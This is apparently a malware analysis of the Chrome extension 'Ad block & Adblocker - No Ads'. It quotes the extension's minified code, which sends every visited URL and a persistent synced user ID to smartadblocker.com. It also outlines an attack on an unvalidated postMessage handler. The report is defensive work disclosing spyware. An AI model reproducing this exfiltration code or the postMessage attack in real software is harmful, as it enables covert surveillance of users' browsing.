# Security Analysis: Ad block & Adblocker - No Ads (gbdjcgalliefpinpmggefbloehmmknca)

## Extension Metadata
- **Name**: Ad block & Adblocker - No Ads
- **Extension ID**: gbdjcgalliefpinpmggefbloehmmknca
- **Version**: 1.9.3
- **Manifest Version**: 3
- **Estimated Users**: ~700,000
- **Analysis Date**: 2026-02-14

## Executive Summary
Ad block & Adblocker - No Ads is **CRITICAL SPYWARE** that exfiltrates complete browsing history to smartadblocker.com. The extension masquerades as an ad blocker but transmits every visited URL along with a persistent user tracking ID to a remote server on every page load. This represents severe privacy violation affecting 700,000+ users.

**Overall Risk Assessment: CRITICAL**

## Vulnerability Assessment

### 1. Browsing History Exfiltration (CRITICAL SEVERITY)
**Severity**: CRITICAL
**Files**: `/js/bg.js` (lines 1-200)

**Analysis**:
The extension implements comprehensive browsing surveillance by sending every URL visited to an external server.

**Code Evidence** (`bg.js`, chrome.tabs.onUpdated listener):
```javascript
chrome.tabs.onUpdated.addListener((async(e,t,r)=>{
  const{status:n}=t,{url:a,id:c}=r;
  if("complete"===n){
    let t={url:a,userId:await s("userId")};
    const r=await(async(e,t)=>await(async(e,t={})=>{
      try{
        const s=await fetch(e,{
          method:"POST",
          credentials:"include",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify(t)
        });
        return await s.json()
      }catch(e){}
    })("https://smartadblocker.com/extension/rules/api",t))(0,t);
```

**Data Transmitted**:
- **Every URL visited** (`url: a` where `a` is the full page URL)
- **Persistent user tracking ID** (`userId` from chrome.storage.sync)
- **Sent on EVERY page load** (triggered by `chrome.tabs.onUpdated` with `status: "complete"`)

**Exfiltration Endpoint**:
- `https://smartadblocker.com/extension/rules/api` (POST request)
- Sends JSON payload: `{url: "https://...", userId: "uuid"}`

**Tracking Mechanism**:
On installation, the extension generates a UUID and stores it persistently:
```javascript
chrome.runtime.onInstalled.addListener((async function(e){
  if("install"==e.reason){
    chrome.storage.sync.set({userId:a(),switchOn:!0})  // a() generates UUID
  }
}))
```

**Privacy Impact**: **EXTREME**
- Complete browsing history logged and transmitted
- Cross-device tracking via chrome.storage.sync (userId syncs across Chrome instances)
- No opt-out mechanism
- No user disclosure of data collection
- Includes banking URLs, medical sites, private emails, social media activity

**Verdict**: **CRITICAL MALWARE** - This is spyware-grade surveillance, not ad blocking.

---

### 2. Persistent Cross-Device User Tracking
**Severity**: CRITICAL
**Files**: `/js/bg.js`

**Analysis**:
The extension assigns each user a permanent UUID that syncs across all Chrome instances via `chrome.storage.sync`.

**Tracking ID Generation**:
```javascript
const a=function(t,s,a){
  if(e.randomUUID&&!s&&!t)return e.randomUUID();
  // UUID v4 generation algorithm
};

chrome.storage.sync.set({userId:a(),switchOn:!0})
```

**Cross-Device Tracking**:
- UUID stored in `chrome.storage.sync` (syncs across devices)
- Never deleted or rotated
- Allows operator to build complete profile across all user devices
- Links browsing behavior from work laptop, home computer, mobile Chrome

**Verdict**: **CRITICAL** - Enables permanent, cross-device user profiling.

---

### 3. Postmessage Handler Without Origin Validation
**Severity**: HIGH
**Files**: `/js/b.js` (web-accessible resource)

**Analysis**:
The web-accessible resource `b.js` contains a Twitch ad-blocking script with unsafe message handling.

**Code Evidence** (`b.js`, line 1):
```javascript
window.addEventListener("message",(e=>{
  switch(e.data.type){
    case"setSettings":
      t.postMessage({funcName:"setSettings",value:e.data.value})
  }
}))
```

**Vulnerability**:
- No origin validation (`e.origin` not checked)
- Any website can send messages via injected iframe
- Could be weaponized to manipulate extension settings or trigger exfiltration

**Attack Scenario**:
1. Malicious site embeds `chrome-extension://gbdjcgalliefpinpmggefbloehmmknca/js/b.js`
2. Site sends `postMessage({type: "setSettings", value: {...}}, "*")`
3. Extension worker receives manipulated settings

**Verdict**: **HIGH** - Unsafe message handling, but secondary to exfiltration issue.

---

### 4. Remote Configuration Control
**Severity**: MEDIUM
**Files**: `/js/bg.js`

**Analysis**:
The server response can dynamically inject blocking rules and modify extension behavior.

**Code Evidence**:
```javascript
for(const t in r)
  ("id"===t||"genericId"===t)&&r[t]&&r[t].length>0?
    chrome.tabs.sendMessage(e,{message:"remove-id-div",idList:r[t],...})
  :("class"===t||"genericClass"===t)&&r[t]&&r[t].length>0?
    chrome.tabs.sendMessage(e,{message:"remove-class-div",classList:r[t],...})
  :"rules"===t?r.updateRules&&o(r[t],r.rule_scope,e)
```

**Server Controls**:
- `id` / `genericId`: Element IDs to remove from pages
- `class` / `genericClass`: CSS classes to remove
- `rules`: Dynamic declarativeNetRequest rules to inject
- `cc`: Country code configuration to enable locale-specific rulesets

**Risk**:
- Server can inject arbitrary DOM manipulation
- Could be used to hide security warnings, inject content, or modify page behavior
- No integrity verification of server commands

**Verdict**: **MEDIUM** - Remote control capability, but overshadowed by spyware functionality.

---

## Network Activity Analysis

### External Endpoints

| Domain | Purpose | Data Transmitted | Frequency |
|--------|---------|------------------|-----------|
| `smartadblocker.com/extension/rules/api` | **Browsing history exfiltration** | Full URL + persistent user ID (POST) | **Every page load** |

### Data Flow Summary

**Data Collection**: **COMPREHENSIVE**
- Every URL visited (including query parameters, fragments)
- Persistent cross-device user tracking ID
- Tab update events (page loads, navigation)

**User Data Transmitted**: **COMPLETE BROWSING HISTORY**
**Tracking/Analytics**: **PERSISTENT CROSS-DEVICE TRACKING**
**Third-Party Services**: smartadblocker.com (unknown operator)

**The extension transmits complete browsing history with persistent tracking to an external server. This is SPYWARE.**

## Permission Analysis

| Permission | Declared Use | Actual Use | Risk Level |
|------------|--------------|------------|------------|
| `tabs` | Ad blocking | **Browsing history exfiltration** | CRITICAL (abused) |
| `storage` | Settings storage | Persistent user tracking ID | CRITICAL (abused) |
| `declarativeNetRequest` | Ad blocking rules | Legitimate (but overshadowed) | Low |
| `declarativeNetRequestFeedback` | Rule debugging | Appears unused | Low |
| `host_permissions: <all_urls>` | Block ads on all sites | **Monitor all browsing** | CRITICAL (abused) |

**Assessment**: Core permissions are weaponized for spyware. The `tabs` permission enables URL exfiltration, while `storage` enables cross-device tracking.

## Code Quality Observations

### Malicious Indicators
1. **URL exfiltration on every page load** (smoking gun)
2. **Persistent cross-device user tracking** (UUID generation + sync storage)
3. **No user disclosure** of data collection
4. **Obfuscated code** (minified variable names obscure intent)
5. **Network calls hidden in tab update listeners** (disguised as ad blocking)

### Deceptive Design
- Extension presents as ad blocker (includes legitimate declarativeNetRequest rules)
- Also contains real Twitch ad-blocking code (`b.js`)
- Exfiltration logic buried in seemingly benign update listener
- No privacy policy disclosure in manifest or description

### Obfuscation Level
**MEDIUM-HIGH** - Heavy minification with single-letter variable names. Function logic is straightforward once deobfuscated, but structure obscures malicious intent.

## Comparison to Known Malicious Patterns

| Malicious Pattern | Present? | Evidence |
|-------------------|----------|----------|
| **Browsing history exfiltration** | ✓ YES | Every URL sent to smartadblocker.com with userId |
| **Persistent user tracking** | ✓ YES | UUID generation + chrome.storage.sync |
| **Cross-device tracking** | ✓ YES | storage.sync enables profile linking |
| Remote config/kill switches | ✓ YES | Server controls dynamic rules + element removal |
| Postmessage without origin check | ✓ YES | b.js message handler lacks validation |
| Extension enumeration/killing | ✗ No | No chrome.management usage |
| Residential proxy infrastructure | ✗ No | No proxy configuration |
| XHR/fetch hooking | ✗ No | No prototype modifications |

## Comparison to "Adblock Ad Blocker Pro" (dgjbaljgolmlcmmklmmeafecikidmjpi)

**Similarities**:
1. Both exfiltrate browsing history to external servers
2. Both use persistent user tracking IDs
3. Both masquerade as ad blockers
4. Both have 500K+ users

**Differences**:
| Feature | This Extension (smartadblocker.com) | Known Malware (adblox.org) |
|---------|-------------------------------------|----------------------------|
| Domain | smartadblocker.com | adblox.org |
| Users | 700,000 | ~500,000 |
| Exfil Trigger | chrome.tabs.onUpdated | (need to verify) |
| Additional Features | Twitch ad blocking (b.js) | (unknown) |

**Verdict**: **SAME THREAT CLASS** - This is a different spyware operation using identical tactics.

## Overall Risk Assessment

### Risk Level: **CRITICAL**

**Justification**:
1. **Complete browsing history exfiltration** to external server on every page load
2. **Persistent cross-device user tracking** via synced UUID
3. **700,000+ affected users** - massive privacy violation at scale
4. **No user disclosure** - deceptive ad blocking claims
5. **No legitimate justification** for URL collection (ad blocking doesn't require server-side URL transmission)

### Recommendations
- **IMMEDIATE REMOVAL** from Chrome Web Store
- **User notification** - all 700K users should be warned
- **Forensic investigation** of smartadblocker.com operator
- **Cross-reference** with "Adblock Ad Blocker Pro" spyware network
- **Potential law enforcement referral** - GDPR/CCPA violations for undisclosed tracking

### User Privacy Impact
**CATASTROPHIC** - The extension collects:
- Every website visited (including banking, medical, email, social media)
- Complete browsing timeline
- Cross-device behavior patterns
- Persistent user identifier for profile aggregation

This data enables:
- Identity theft preparation (knowing when users visit banks)
- Blackmail material (sensitive browsing history)
- Targeted phishing (knowing user's services)
- Sale to data brokers

## Technical Summary

**Lines of Code**: ~450 (background script) + ~150 (popup) + ~600 (b.js Twitch module)
**External Dependencies**: None (self-contained UUID generation)
**Third-Party Libraries**: None
**Remote Code Loading**: None (but remote configuration control)
**Dynamic Code Execution**: None

## Indicators of Compromise

**Network indicators**:
- POST requests to `https://smartadblocker.com/extension/rules/api`
- JSON payloads containing `{"url": "...", "userId": "..."}`

**Storage indicators**:
- `chrome.storage.sync.userId` - persistent tracking UUID
- `chrome.storage.sync.switchOn` - extension state
- `chrome.storage.sync.ctCode` / `cArr` - country code configuration

**Behavioral indicators**:
- Network request on every page load (even HTTPS-only sites)
- Persistent UUID generation on install
- No user-facing privacy controls

## Evidence Summary

**Exfiltration Code Path**:
1. User navigates to any URL
2. `chrome.tabs.onUpdated` fires with `status: "complete"`
3. Extension extracts `url` from tab object
4. Extension retrieves `userId` from `chrome.storage.sync`
5. Extension sends `fetch("https://smartadblocker.com/extension/rules/api", {method: "POST", body: JSON.stringify({url, userId})})`
6. Server receives complete browsing history

**This is not a bug. This is intentional spyware.**

## Conclusion

"Ad block & Adblocker - No Ads" is **CRITICAL SPYWARE** that exfiltrates complete browsing history to smartadblocker.com. The extension generates a persistent cross-device tracking ID and transmits every visited URL with zero user disclosure. With 700,000+ installations, this represents one of the most severe privacy violations in the Chrome Web Store.

The extension uses ad blocking as a cover story while operating as comprehensive surveillance software. It should be immediately removed from the store, and all users should be notified of the data breach.

**Final Verdict: CRITICAL SPYWARE** - Immediate action required.

## Tags
- `malware:spyware`
- `malware:data_exfil`
- `privacy:browsing_history`
- `privacy:persistent_tracking`
- `privacy:cross_device_tracking`
- `vuln:postmessage_no_origin`
- `behavior:deceptive_claims`
- `behavior:remote_config`
